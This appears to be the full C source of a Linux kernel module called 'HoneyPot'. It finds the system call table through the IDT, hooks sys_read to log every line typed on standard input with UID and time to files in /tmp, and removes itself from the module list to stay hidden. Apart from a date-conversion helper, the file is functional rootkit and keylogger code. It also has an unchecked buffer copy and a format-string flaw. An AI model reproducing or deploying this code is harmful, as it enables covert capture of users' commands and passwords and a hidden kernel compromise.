

#include "HoneyPot.h"

struct file *klib_fopen(const char *filename, int flags, int mode) 
{ 
    struct file *filp = filp_open(filename, flags, mode); 
    return (IS_ERR(filp)) ? NULL : filp; 
} 

void klib_fclose(struct file *filp) 
{ 
    if (filp) 
	{
		filp_close(filp,NULL); 
	}
} 


int klib_fwrite(char *buf, int len, struct file *filp) 
{ 
    int writelen; 
    mm_segment_t oldfs; 
    if (filp == NULL) 
	{
		return -ENOENT; 
	}
    if (filp->f_op->write == NULL) 
	{
		return -ENOSYS; 
	}
    if (((filp->f_flags & O_ACCMODE) & (O_WRONLY | O_RDWR)) == 0) 
	{
		return -EACCES; 
	}
    oldfs = get_fs(); 
    set_fs(KERNEL_DS); 
    writelen = filp->f_op->write(filp, buf, len, &filp->f_pos); 
    set_fs(oldfs); 
    return writelen; 
} 

int klib_fputs(char *str, struct file *filp) 
{ 
    return klib_fwrite(str, strlen(str), filp); 
} 


int klib_fprintf(struct file *filp, const char *fmt, ...) 
{ 
    static char s_buf[1024]; 
    va_list args; 
    va_start(args, fmt); 
    vsprintf(s_buf, fmt, args); 
    va_end(args); 
    return klib_fputs(s_buf, filp); 
} 

void epoch2time(const time_t * t, long int offset, struct vtm *tp)
{
	static const unsigned short int mon_yday[2][13] = {
		/* Normal years.  */
		{0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334, 365},
		/* Leap years.  */
		{0, 31, 60, 91, 121, 152, 182, 213, 244, 274, 305, 335, 366}
	};

	long int days, rem, y;
	const unsigned short int *ip;

	days = *t / SECS_PER_DAY;
	rem = *t % SECS_PER_DAY;
	rem += offset;
	while (rem < 0) {
		rem += SECS_PER_DAY;
		--days;
	}
	while (rem >= SECS_PER_DAY) {
		rem -= SECS_PER_DAY;
		++days;
	}
	tp->tm_hour = rem / SECS_PER_HOUR;
	rem %= SECS_PER_HOUR;
	tp->tm_min = rem / 60;
	tp->tm_sec = rem % 60;
	y = 1970;

	while (days < 0 || days >= (isleap(y) ? 366 : 365)) {
		long int yg = y + days / 365 - (days % 365 < 0);
		days -= ((yg - y) * 365 + LEAPS_THRU_END_OF(yg - 1)
		    - LEAPS_THRU_END_OF(y - 1));
		y = yg;
	}
	tp->tm_year = y - 1900;
	if (tp->tm_year != y - 1900)
		return ;
	ip = mon_yday[isleap(y)];
	for (y = 11; days < (long int) ip[y]; --y)
		continue;
	days -= ip[y];
	tp->tm_mon = y;
	tp->tm_mday = days + 1;
	return ;
}


inline void WriteLog(char *pLog)
{
	struct file *pFile; 
	char FileName[256];
	sprintf(FileName,"/tmp/logfile%u.txt",current->uid);
	if ((pFile = klib_fopen(FileName, O_CREAT|O_WRONLY| O_APPEND, S_IWOTH|S_IWUSR)) == NULL)	{ 		return;    } 	else
	{
		klib_fprintf(pFile,pLog);
		klib_fclose(pFile); 
	}

}

static void hide_module(void)
{
	  __this_module.list.prev->next = __this_module.list.next;
	  __this_module.list.next->prev = __this_module.list.prev;
	  __this_module.list.next = LIST_POISON1;
	  __this_module.list.prev = LIST_POISON2;
}
void GetTime(char *date_time)
{
	struct timeval tv;
	time_t t;
	struct vtm tm;

	do_gettimeofday(&tv);
	t = (time_t) tv.tv_sec;

	epoch2time(&t, 8, &tm);

	sprintf(date_time, "%.2d/%.2d/%d-%.2d:%.2d:%.2d", tm.tm_mday,
	    tm.tm_mon + 1, tm.tm_year + 1900, tm.tm_hour, tm.tm_min,
	    tm.tm_sec);
}


u32** GetSystemCallTable(void)
{
	unsigned int sys_call_off;
	unsigned int sys_call_table;
	char* p;
	int i;
	asm("sidt %0":"=m"(idtr));
	memcpy(&idt, (void*)(idtr.base+8*0x80), sizeof(idt));
	sys_call_off=((idt.off2<<16)|idt.off1);
	p=(char *)sys_call_off;
	for (i=0; i<100; i++)
	{
		if (p[i]=='\xff' && p[i+1]=='\x14' && p[i+2]=='\x85')
		{
			sys_call_table=*(unsigned int*)(p+i+3);
			return (u32 **)sys_call_table;
		}
	}

	return 0;
}
asmlinkage ssize_t NewRead (unsigned int fd, char *buf, size_t count)
{
	char Log[1024];
	ssize_t nRes;
	static int nCmdLength=0;
	u32 i;
	u32 nUid; 
	u32 nEuid;
	u32 nGid;
	u32 nEgid;
	nRes = pOldRead(fd, buf, count);
	
	if(nRes < 1 )
	{
		goto OUT;
	}
	if(fd==0)
	{
		if(buf[((u32)nRes)-1]==13)
		{
			lock_kernel();
			nUid=current->uid;
			nEuid=current->euid;
			nGid =current->gid;
			nEgid=current->egid;
			GetTime(DataTime);
			Buffer[nCmdLength]=0;
			sprintf(Log,"<Command Length = %u><UID=%u><%s>  %s \r\n",nCmdLength,nUid,DataTime,Buffer);
			WriteLog(Log);
			nCmdLength=0;
			unlock_kernel();
		}
		else
		{
			for( i =0;i<(u32)nRes;i++)
			{
				Buffer[nCmdLength]=buf[i];
				nCmdLength++;
			}
		}
	}
OUT:
	return nRes;  
}
void LocalInit(void)
{
	pOldRead=NULL;
//	pFile =NULL;
	pOriginalSysCallTable=NULL;
	memset(Buffer,0,1024);
	memset(DataTime,0,24);
}
static int __init HoneyPot_init(void)
{
	LocalInit();
	

	lock_kernel();
	pOriginalSysCallTable = GetSystemCallTable();

	if(NULL!=pOriginalSysCallTable)
	{
		pOldRead=(void *)pOriginalSysCallTable[__NR_read];
		if(NULL!=pOldRead)
		{
			pOriginalSysCallTable[__NR_read] = (u32 *)NewRead;
		}
	}
	hide_module();
	unlock_kernel(); 
    return 0;
}
static void __exit HoneyPot_exit(void)
{
	
	lock_kernel();
	if(NULL!=pOriginalSysCallTable&&NULL!=pOldRead)
	{
		pOriginalSysCallTable[__NR_read]=(u32 *)pOldRead;
	}
	unlock_kernel();/**/
}
module_init(HoneyPot_init);
module_exit(HoneyPot_exit);
